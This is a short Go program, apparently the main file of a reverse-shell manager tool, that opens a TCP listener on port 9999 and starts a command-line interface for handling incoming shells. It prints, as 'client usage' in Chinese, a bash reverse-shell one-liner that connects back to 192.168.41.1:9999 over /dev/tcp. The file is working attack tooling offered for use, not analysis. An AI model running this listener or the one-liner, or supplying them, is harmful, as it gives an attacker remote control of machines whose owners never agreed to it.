package main
import ("github.com/reverse_shell_manager/lib"
"fmt")


func main(){
	fmt.Print("客服端用法:bash -c 'bash -i >/dev/tcp/192.168.41.1/9999 0>&1\n")
	s := lib.CreateTcpServer("0.0.0.0","9999")
	go s.Run()
	lib.Cli()
}